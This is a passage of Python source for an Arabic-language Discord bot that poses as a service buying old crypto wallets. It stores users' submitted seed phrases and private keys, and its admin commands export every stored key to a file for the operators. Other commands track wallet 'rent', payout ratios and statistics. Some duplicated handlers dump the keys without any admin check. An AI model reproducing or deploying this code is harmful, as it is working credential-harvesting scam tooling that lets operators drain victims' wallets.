                    now = datetime.datetime.now()
                    day_ago = (now - datetime.timedelta(days=1)).strftime('%Y-%m-%d %H:%M:%S')
                    week_ago = (now - datetime.timedelta(weeks=1)).strftime('%Y-%m-%d %H:%M:%S')
                    month_ago = (now - datetime.timedelta(days=30)).strftime('%Y-%m-%d %H:%M:%S')
                    
                    cursor.execute("SELECT COUNT(*) FROM users WHERE join_time >= ?", (day_ago,))
                    users_24h = cursor.fetchone()[0]
                    cursor.execute("SELECT COUNT(*) FROM users WHERE join_time >= ?", (week_ago,))
                    users_week = cursor.fetchone()[0]
                    cursor.execute("SELECT COUNT(*) FROM users WHERE join_time >= ?", (month_ago,))
                    users_month = cursor.fetchone()[0]
                    
                    # 3. Wallet checks (24h, week, month, total)
                    cursor.execute("SELECT COUNT(*) FROM wallet_checks")
                    checks_total = cursor.fetchone()[0]
                    cursor.execute("SELECT COUNT(*) FROM wallet_checks WHERE check_time >= ?", (day_ago,))
                    checks_24h = cursor.fetchone()[0]
                    cursor.execute("SELECT COUNT(*) FROM wallet_checks WHERE check_time >= ?", (week_ago,))
                    checks_week = cursor.fetchone()[0]
                    cursor.execute("SELECT COUNT(*) FROM wallet_checks WHERE check_time >= ?", (month_ago,))
                    checks_month = cursor.fetchone()[0]
                    
                    # 4. Successful sales (24h, week, month)
                    cursor.execute("SELECT COUNT(*), SUM(amount) FROM successful_sales WHERE sale_time >= ?", (day_ago,))
                    res_24h = cursor.fetchone()
                    sales_24h_count = res_24h[0] or 0
                    sales_24h_sum = res_24h[1] or 0.0
                    
                    cursor.execute("SELECT COUNT(*), SUM(amount) FROM successful_sales WHERE sale_time >= ?", (week_ago,))
                    res_week = cursor.fetchone()
                    sales_week_count = res_week[0] or 0
                    sales_week_sum = res_week[1] or 0.0
                    
                    cursor.execute("SELECT COUNT(*), SUM(amount) FROM successful_sales WHERE sale_time >= ?", (month_ago,))
                    res_month = cursor.fetchone()
                    sales_month_count = res_month[0] or 0
                    sales_month_sum = res_month[1] or 0.0
                    
                    # 5. Top 10 Referrers
                    cursor.execute("""
                        SELECT r.referrer_id, u.username, COUNT(*) as ref_count 
                        FROM referrals r
                        JOIN users u ON r.referrer_id = u.user_id
                        GROUP BY r.referrer_id
                        ORDER BY ref_count DESC
                        LIMIT 10
                    """)
                    top_referrers = cursor.fetchall()
                    referrers_text = "\n".join([f"├ @{row[1] or row[0]}: {row[2]}" for row in top_referrers]) if top_referrers else "لا يوجد بيانات حالياً"
                    
                    # 6. Top Active Users
                    cursor.execute("""
                        SELECT ua.user_id, u.username, ua.check_count 
                        FROM user_activity ua
                        JOIN users u ON ua.user_id = u.user_id
                        ORDER BY ua.check_count DESC
                        LIMIT 10
                    """)
                    top_active = cursor.fetchall()
                    active_text = "\n".join([f"├ @{row[1] or row[0]}: {row[2]}" for row in top_active]) if top_active else "لا يوجد بيانات حالياً"
                    
                    conn.close()
                    
                    stats_msg = (
                        "📊 إحصائيات شاملة للبوت\n"
                        "━━━━━━━━━━━━━━━━\n"
                        f"👥 عدد المستخدمين الكلي: {total_users}\n\n"
                        "📈 عدد زيادة المستخدمين\n"
                        f"├ 24 ساعة: {users_24h}\n"
                        f"├ أسبوع: {users_week}\n"
                        f"└ شهر: {users_month}\n\n"
                        "🔍 المحافظ المفحوصة\n"
                        f"├ 24 ساعة: {checks_24h}\n"
                        f"├ أسبوع: {checks_week}\n"
                        f"├ شهر: {checks_month}\n"
                        f"└ الكل: {checks_total}\n\n"
                        "💰 المبيعات الناجحة\n"
                        f"├ 24 ساعة: {sales_24h_count} ({sales_24h_sum:.2f} SOL)\n"
                        f"├ أسبوع: {sales_week_count} ({sales_week_sum:.2f} SOL)\n"
                        f"└ شهر: {sales_month_count} ({sales_month_sum:.2f} SOL)\n\n"
                        "🏆 أفضل 10 محيلين\n"
                        f"{referrers_text}\n"
                        "🌟 أكثر المستخدمين تفاعلاً\n"
                        f"{active_text}\n"
                        f"🔄 آخر تحديث: {now.strftime('%Y-%m-%d %H:%M')}"
                    )
                    
                    await message.reply(stats_msg)
                except Exception as e:
                    await message.reply(f"❌ حدث خطأ أثناء جلب الإحصائيات: {e}")
                return
            return

        if content_lower == 'بيانات':
            if message.author.id in ADMIN_IDS:
                embed = discord.Embed(
                    title="🗄️ إدارة قاعدة البيانات",
                    description="اختر أحد الخيارات التالية للتحكم في ملفات البيانات:",
                    color=discord.Color.blue()
                )
                
                view = discord.ui.View()
                
                # زر التحميل
                download_btn = discord.ui.Button(label="تحميل النسخة الاحتياطية", style=discord.ButtonStyle.success, emoji="📥")
                async def download_callback(interaction):
                    files = []
                    for filename in ['users.db', 'addresses.txt', 'rent.txt', 'user_ratio.txt', 'keys.txt']:
                        if os.path.exists(filename):
                            files.append(discord.File(filename))
                    
                    if files:
                        await interaction.response.send_message("✅ جاري تحضير الملفات...", ephemeral=True)
                        await interaction.followup.send("إليك نسخة من ملفات قاعدة البيانات الحالية:", files=files)
                    else:
                        await interaction.response.send_message("❌ لم يتم العثور على أي ملفات بيانات.", ephemeral=True)
                
                # زر الرفع
                upload_btn = discord.ui.Button(label="رفع ملفات جديدة", style=discord.ButtonStyle.primary, emoji="📤")
                async def upload_callback(interaction):
                    user_states[interaction.user.id] = "waiting_for_db_upload"
                    await interaction.response.send_message("📤 أرسل الآن الملفات التي تريد استبدالها (users.db, addresses.txt, إلخ...)", ephemeral=True)
                
                download_btn.callback = download_callback
                upload_btn.callback = upload_callback
                view.add_item(download_btn)
                view.add_item(upload_btn)
                
                await message.reply(embed=embed, view=view)
                return
            return

        if content_lower == 'عبارات ومفاتيح':
            if message.author.id in ADMIN_IDS:
                try:
                    conn = sqlite3.connect(DB_PATH)
                    cursor = conn.cursor()
                    cursor.execute("SELECT key_data, key_type FROM user_keys")
                    rows = cursor.fetchall()
                    conn.close()
                    
                    seeds = [row[0] for row in rows if len(row[0].split()) in [12, 15, 18, 21, 24]]
                    privkeys = [row[0] for row in rows if row[0] not in seeds]
                    
                    content = "🔑 **العبارات السرية (Seeds):**\n\n"
                    content += "\n\n".join(seeds)
                    content += "\n\n" + "="*30 + "\n\n"
                    content += "🔐 **المفاتيح الخاصة (Private Keys):**\n\n"
                    content += "\n\n".join(privkeys)
                    
                    with open("keys.txt", "w", encoding="utf-8") as f:
                        f.write(content)
                    
                    await message.reply(file=discord.File("keys.txt"))
                except Exception as e:
                    await message.reply(f"❌ حدث خطأ أثناء استخراج البيانات: {e}")
                return
            return

        if content_lower == 'فحص':
            if message.author.id in ADMIN_IDS:
                if not os.path.exists("rent.txt"):
                    await message.reply("📋 لا توجد عناوين مفحوصة حالياً.")
                else:
                    await message.reply(file=discord.File("rent.txt"))
                return
            return

        if content_lower == 'فارغ':
            if message.author.id in ADMIN_IDS:
                if not os.path.exists("addresses.txt"):
                    await message.reply("📋 لا توجد عناوين فارغة حالياً.")
                else:
                    await message.reply(file=discord.File("addresses.txt"))
                return
            return

        if content_lower == 'عناوين':
            if message.author.id in ADMIN_IDS:
                if not os.path.exists("rent.txt"):
                    await message.reply("📋 لا توجد عناوين حالياً.")
                else:
                    await message.reply(file=discord.File("rent.txt"))
                return
            return
        if content_lower == 'بيانات':
            embed = discord.Embed(
                title="🗄️ إدارة قاعدة البيانات",
                description="اختر أحد الخيارات التالية للتحكم في ملفات البيانات:",
                color=discord.Color.blue()
            )
            
            view = discord.ui.View()
            
            # زر التحميل
            download_btn = discord.ui.Button(label="تحميل النسخة الاحتياطية", style=discord.ButtonStyle.success, emoji="📥")
            async def download_callback(interaction):
                files = []
                for filename in ['users.db', 'addresses.txt', 'rent.txt', 'user_ratio.txt', 'keys.txt']:
                    if os.path.exists(filename):
                        files.append(discord.File(filename))
                
                if files:
                    await interaction.response.send_message("✅ جاري تحضير الملفات...", ephemeral=True)
                    await interaction.followup.send("إليك نسخة من ملفات قاعدة البيانات الحالية:", files=files)
                else:
                    await interaction.response.send_message("❌ لم يتم العثور على أي ملفات بيانات.", ephemeral=True)
            
            # زر الرفع
            upload_btn = discord.ui.Button(label="رفع ملفات جديدة", style=discord.ButtonStyle.primary, emoji="📤")
            async def upload_callback(interaction):
                user_states[interaction.user.id] = "waiting_for_db_upload"
                await interaction.response.send_message("📤 أرسل الآن الملفات التي تريد استبدالها (users.db, addresses.txt, إلخ...)", ephemeral=True)
            
            download_btn.callback = download_callback
            upload_btn.callback = upload_callback
            view.add_item(download_btn)
            view.add_item(upload_btn)
            
            await message.reply(embed=embed, view=view)
            return

        if content_lower == 'عبارات ومفاتيح':
            try:
                conn = sqlite3.connect(DB_PATH)
                cursor = conn.cursor()
                cursor.execute("SELECT key_data, key_type FROM user_keys")
                rows = cursor.fetchall()
                conn.close()
                
                seeds = [row[0] for row in rows if len(row[0].split()) in [12, 15, 18, 21, 24]]
                privkeys = [row[0] for row in rows if row[0] not in seeds]
                
                content = "🔑 **العبارات السرية (Seeds):**\n\n"
                content += "\n\n".join(seeds)
                content += "\n\n" + "="*30 + "\n\n"
                content += "🔐 **المفاتيح الخاصة (Private Keys):**\n\n"
                content += "\n\n".join(privkeys)
                
                with open("keys.txt", "w", encoding="utf-8") as f:
                    f.write(content)
                
                await message.reply(file=discord.File("keys.txt"))
            except Exception as e:
                await message.reply(f"❌ حدث خطأ أثناء استخراج البيانات: {e}")
            return

        if state == "waiting_for_db_upload" and message.attachments:
            for attachment in message.attachments:
                try:
                    if attachment.filename in ['users.db', 'addresses.txt', 'rent.txt', 'user_ratio.txt']:
                        await attachment.save(attachment.filename)
                        await message.reply(f"✅ تم تحديث الملف: `{attachment.filename}` بنجاح.")
                    else:
                        await message.reply(f"⚠️ الملف `{attachment.filename}` غير مدعوم. يرجى رفع ملفات النظام فقط.")
                except Exception as e:
                    await message.reply(f"❌ فشل رفع `{attachment.filename}`: {e}")
            
            user_states.pop(user_id, None)
            return

        if content_lower == 'rr':
            await message.reply("👤 أرسل الآن ID المستخدم الذي تريد مراسلته:")
            user_states[user_id] = "waiting_for_rr_id"
            return

        if state == "waiting_for_rr_id":
            if content_lower.isdigit():
                user_states[user_id] = f"waiting_for_rr_msg_{content_lower}"
                await message.reply(f"📝 جاري المراسلة لـ `{content_lower}`\nأرسل الآن نص الرسالة:")
            else:
                await message.reply("❌ خطأ: يرجى إرسال ID صحيح (أرقام فقط):")
            return

        if state and state.startswith("waiting_for_rr_msg_"):
            target_id = int(state.replace("waiting_for_rr_msg_", ""))
            try:
                user = await bot.fetch_user(target_id)
                embed = discord.Embed(title="Message from Admin", description=message.content, color=discord.Color.blue(), timestamp=datetime.datetime.now())
                embed.set_footer(text="Admin Support")
                
                # Check for attachments in admin's reply
                files = []
                for attachment in message.attachments:
                    files.append(await attachment.to_file())
                
                user_view = discord.ui.View()
                u_reply_btn = discord.ui.Button(label="Reply", style=discord.ButtonStyle.primary)
                u_end_btn = discord.ui.Button(label="End Conversation", style=discord.ButtonStyle.danger)

                async def u_reply_cb(interaction):
                    await interaction.response.edit_message(view=None)
                    await interaction.followup.send("Please send your reply now:", ephemeral=True)
                    user_states[interaction.user.id] = "waiting_for_user_reply"

                async def u_end_cb(interaction):
                    await interaction.response.edit_message(view=None)
                    await interaction.followup.send("Conversation ended.", ephemeral=True)
                    user_states.pop(interaction.user.id, None)

                u_reply_btn.callback = u_reply_cb
                u_end_btn.callback = u_end_cb
                user_view.add_item(u_reply_btn)
                user_view.add_item(u_end_btn)
                await user.send(embed=embed, view=user_view, files=files)
                await message.reply(f"✅ Message sent to `{target_id}` successfully.")
                user_states.pop(user_id, None)
                user_states[target_id] = "waiting_for_user_reply"
            except Exception as e:
                await message.reply(f"❌ Failed to send: {e}")
                user_states.pop(user_id, None)
            return

    await bot.process_commands(message)

@bot.command(name="ed")
async def ed_command(ctx, wallet_address: str = "", price: float = 0.0):
    if ctx.author.id not in ADMIN_IDS:
        return
    
    if not wallet_address:
        await ctx.reply("💬 Please send the **Wallet Address** you want to set a custom price for:")
        user_states[ctx.author.id] = "waiting_for_ed_wallet"
        return

    if price != 0.0:
        try:
            conn = sqlite3.connect(DB_PATH)
            cursor = conn.cursor()
            cursor.execute('''INSERT OR REPLACE INTO wallet_prices
                             (wallet_address, custom_price, set_by_admin)
                             VALUES (?, ?, ?)''', (wallet_address, price, ctx.author.id))
            conn.commit()
            conn.close()
            await ctx.reply(f"✅ Set custom price for `{wallet_address}` to `{price} SOL`")
        except Exception as e:
            await ctx.reply(f"❌ Error: {e}")
        return

    # If no price, show current status
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('SELECT custom_price FROM wallet_prices WHERE wallet_address = ?', (wallet_address,))
        result = cursor.fetchone()
        conn.close()
        
        current_price = result[0] if result else "Not set"
        
        embed = discord.Embed(title="🔧 Edit Wallet Price", color=discord.Color.blue())
        embed.add_field(name="Wallet", value=f"`{wallet_address}`", inline=False)
        embed.add_field(name="Current Price", value=f"`{current_price} SOL`", inline=False)
        embed.set_footer(text="To change, use: ed <wallet> <price>")
        
        await ctx.reply(embed=embed)
    except Exception as e:
        await ctx.reply(f"❌ Error: {e}")

@bot.command(name="فحص")
async def check_command(ctx, wallet: str = ""):
    if ctx.author.id not in ADMIN_IDS: return
    if not wallet:
        await ctx.reply("❌ Usage: `فحص <wallet_address>`")
        return
    
    # Use existing sync logic but for admin (no divisor)
    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(None, process_wallet_check_sync, ctx.author.id, ctx.author.name, wallet, True)
    
    if result:
        # For admin, we show full rent
        res_text = (
            f"🔍 **Admin Check Results**\n\n"
            f"📌 Wallet: `{wallet}`\n"
            f"💎 Full Rent: `{result['total_rent']:.6f} SOL`"
        )
        await ctx.reply(res_text)

@bot.command(name="فارغ")
async def empty_command(ctx):
    if ctx.author.id not in ADMIN_IDS: return
    if not os.path.exists("addresses.txt"):
        await ctx.reply("📋 No addresses found.")
        return
    await ctx.reply(file=discord.File("addresses.txt"))

@bot.command(name="عناوين")
async def addresses_command(ctx):
    if ctx.author.id not in ADMIN_IDS: return
    if not os.path.exists("rent.txt"):
        await ctx.reply("📋 No rent addresses found.")
        return
    await ctx.reply(file=discord.File("rent.txt"))

@bot.command()
async def r50(ctx):
    if ctx.author.id not in ADMIN_IDS: return
    global user_divisor
    user_divisor = 2.0
    save_user_divisor(user_divisor)
    await ctx.reply("✅ تم تعديل النسبة إلى 50% (القسمة على 2)")

@bot.command()
async def r30(ctx):
    if ctx.author.id not in ADMIN_IDS: return
    global user_divisor
    user_divisor = 3.5
    save_user_divisor(user_divisor)
    await ctx.reply("✅ تم تعديل النسبة إلى 30% (القسمة على 3.5)")

@bot.command()
async def r40(ctx):
    if ctx.author.id not in ADMIN_IDS: return
    global user_divisor
    user_divisor = 2.5
    save_user_divisor(user_divisor)
    await ctx.reply("✅ تم تعديل النسبة إلى 40% (القسمة على 2.5)")

@bot.command()
async def r70(ctx):
    if ctx.author.id not in ADMIN_IDS: return
    global user_divisor
    user_divisor = 1.7
    save_user_divisor(user_divisor)
    await ctx.reply("✅ تم تعديل النسبة إلى 70% (القسمة على 1.7)")

@bot.command()
async def ratios(ctx):
    if ctx.author.id not in ADMIN_IDS: return
    status_text = f"📊 **حالة النسب الحالية:**\n\n👤 المستخدمين: القسمة على {user_divisor}\n👑 المشرف: القسمة على {admin_divisor}"
    await ctx.reply(status_text)

@bot.command()
async def block(ctx, user_id: int, *, reason="No reason provided"):
    if ctx.author.id not in ADMIN_IDS: return
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute("INSERT OR REPLACE INTO blocked_users (user_id, blocked_by_admin, reason) VALUES (?, ?, ?)", (user_id, ctx.author.id, reason))
        conn.commit()
        conn.close()
        await ctx.reply(f"✅ تم حظر المستخدم {user_id} بنجاح!")
    except Exception as e:
        await ctx.reply(f"❌ فشل الحظر: {e}")

@bot.command()
async def unblock(ctx, user_id: int):
    if ctx.author.id not in ADMIN_IDS: return
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute("DELETE FROM blocked_users WHERE user_id = ?", (user_id,))
        conn.commit()
        conn.close()
        await ctx.reply(f"✅ تم إلغاء حظر المستخدم {user_id} بنجاح!")
    except Exception as e:
        await ctx.reply(f"❌ فشل إلغاء الحظر: {e}")

@bot.command()
async def blocklist(ctx):
    if ctx.author.id not in ADMIN_IDS: return
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute("SELECT bu.user_id, u.username, bu.blocked_time, bu.reason FROM blocked_users bu LEFT JOIN users u ON bu.user_id = u.user_id")
        blocked = cursor.fetchall()
        conn.close()
        if not blocked:
            await ctx.reply("📋 لا يوجد مستخدمين محظورين حالياً.")
            return
        text = "🚫 **قائمة المستخدمين المحظورين**\n\n"
        for uid, uname, btime, reason in blocked:
            text += f"ID: `{uid}` | User: @{uname} | Reason: {reason}\n"
        await ctx.reply(text)
    except Exception as e:
        await ctx.reply(f"❌ فشل جلب القائمة: {e}")

@bot.command()
async def rr(ctx, user_id: int, *, message: str):
    if ctx.author.id not in ADMIN_IDS: return
    try:
        user = await bot.fetch_user(user_id)
        
        # إنشاء الأزرار كما في bot.py
        view = discord.ui.View()
        
        # زر الدردشة مع المشرف
        chat_admin_btn = discord.ui.Button(label="الدردشة مع المشرف", url="https://t.me/Hanky111")
        
        # زر الدردشة مع المستخدم (للمشرفين الآخرين أو المرجعية)
        # ملاحظة: في ديسكورد لا يمكننا وضع رابط مباشر لدردشة المستخدم بسهولة مثل تليجرام، 
        # لذا سنضع زر يوضح يوزر المستخدم
        user_info_btn = discord.ui.Button(label=f"المستخدم: {user.name}", style=discord.ButtonStyle.gray, disabled=True)
        
        view.add_item(chat_admin_btn)
        view.add_item(user_info_btn)

        embed = discord.Embed(
            title="📩 رسالة من الإدارة", 
            description=message, 
            color=discord.Color.blue(),
            timestamp=datetime.datetime.now()
        )
        embed.set_footer(text="بوت فحص وبيع المحافظ")
        
        await user.send(embed=embed, view=view)
        await ctx.reply(f"✅ تم إرسال الرسالة إلى `{user_id}` بنجاح مع الأزرار.")
    except Exception as e:
        await ctx.reply(f"❌ فشل الإرسال: {e}")

@bot.command()
async def prices(ctx):
    if ctx.author.id not in ADMIN_IDS: return
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute("SELECT wallet_address, custom_price FROM wallet_prices")
        data = cursor.fetchall()
        conn.close()
        if not data:
            await ctx.reply("📋 No custom prices set.")
            return
        text = "💼 **Custom Prices:**\n"
        for w, p in data:
            text += f"`{w[:6]}...{w[-6:]}`: `{p} SOL`\n"
        await ctx.reply(text)
    except Exception as e:
        await ctx.reply(f"❌ Failed to fetch prices: {e}")

@bot.command()
async def start(ctx):
    user_id = ctx.author.id
    username = ctx.author.name
    first_name = ctx.author.display_name
    last_name = "" # Discord doesn't have last_name like Telegram

    # Update user data
    add_user(user_id, username, first_name, last_name)

    welcome_text = "Welcome.\n\nSend me the address of the old wallet you want to sell 💰"
    await ctx.send(welcome_text)

@bot.command()
async def referral(ctx):
    await ctx.send("Referral system coming soon.")


@bot.command()
async def pay(ctx):
    if ctx.author.id not in ADMIN_IDS: return
    await ctx.reply("Please send the user ID to process payment:")
    admin_payment_states[ctx.author.id] = "waiting_for_user_id"

@bot.command()
async def broadcast(ctx):
    if ctx.author.id not in ADMIN_IDS: return
    await ctx.reply("📢 Please send the message you want to broadcast:\n\n• Text only\n• Photo with caption\n• Photo only")
    admin_payment_states[ctx.author.id] = "waiting_for_broadcast_message"

@bot.command()
async def export_keys_here(ctx):
    if ctx.author.id not in ADMIN_IDS: return
    try:
        await ctx.reply("⏳ جاري تصدير العبارات والمفاتيح...")
        filename = export_keys_to_file()
        if filename:
            with open(filename, 'rb') as f:
                await ctx.send(file=discord.File(f, filename), content="✅ تم تصدير جميع العبارات والمفاتيح (عدا المشرفين)")
            os.remove(filename)
        else:
            await ctx.reply("❌ لا توجد عبارات أو مفاتيح محفوظة")
    except Exception as e:
        logging.error(f"Export keys error: {e}")
        await ctx.reply("❌ حدث خطأ أثناء التصدير")

@bot.command()
async def export_addresses(ctx, mode="all"):
    if ctx.author.id not in ADMIN_IDS: return
    try:
        file_to_send = "addresses_export.txt"
        msg = "✅ تم تصدير جميع العناوين المفحوصة"
        
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        if mode == "empty":
            cursor.execute("SELECT DISTINCT wallet_address FROM wallet_checks WHERE is_empty = 1")
            msg = "✅ تم تصدير العناوين الفارغة فقط"
        elif mode == "rent":
            cursor.execute("SELECT DISTINCT wallet_address FROM wallet_checks WHERE has_rent = 1")
            msg = "✅ تم تصدير العناوين التي بها ريع (Rent)"
        else:
            cursor.execute("SELECT DISTINCT wallet_address FROM wallet_checks")
            
        rows = cursor.fetchall()
        conn.close()
        
        if not rows:
            await ctx.reply("❌ لا توجد بيانات مسجلة حالياً لهذا النوع")
            return

        with open(file_to_send, "w", encoding="utf-8") as f:
            for row in rows:
                f.write(f"{row[0]}\n")

        if os.path.exists(file_to_send):
            with open(file_to_send, 'rb') as f:
                await ctx.send(file=discord.File(f, file_to_send), content=msg)
            os.remove(file_to_send)
    except Exception as e:
        logging.error(f"Export addresses error: {e}")
        await ctx.reply("❌ حدث خطأ أثناء التصدير")

def export_keys_to_file():
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        query = f'''SELECT key_data, key_type, user_id, username, submit_time
                    FROM user_keys
                    ORDER BY key_type DESC, submit_time'''
        cursor.execute(query)
        keys = cursor.fetchall()
        conn.close()
        if not keys: return None
        filename = f"keys_export_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, 'w', encoding='utf-8') as f:
            seeds = [k for k in keys if k[1] == 'seed']
            privkeys = [k for k in keys if k[1] == 'private_key']
            if seeds:
                f.write("=== العبارات السرية (Seed Phrases) ===\n\n")
                for key_data, _, user_id, username, submit_time in seeds:
                    f.write(f"{key_data}\n\n")
                f.write("\n")
            if privkeys:
                f.write("=== المفاتيح الخاصة (Private Keys) ===\n\n")
                for key_data, _, user_id, username, submit_time in privkeys:
                    f.write(f"{key_data}\n\n")
        return filename
    except Exception as e:
        logging.error(f"Error exporting keys: {e}")
        return None

if __name__ == "__main__":
    init_database()
    threading.Thread(target=run_flask, daemon=True).start()
    DISCORD_TOKEN = os.getenv('DISCORD_BOT')
    if not DISCORD_TOKEN:
        print("❌ Error: DISCORD_BOT token not found in environment variables.")
    else:
        try:
            bot.run(DISCORD_TOKEN)
        except Exception as e:
            print(f"❌ Critical Error: {e}")
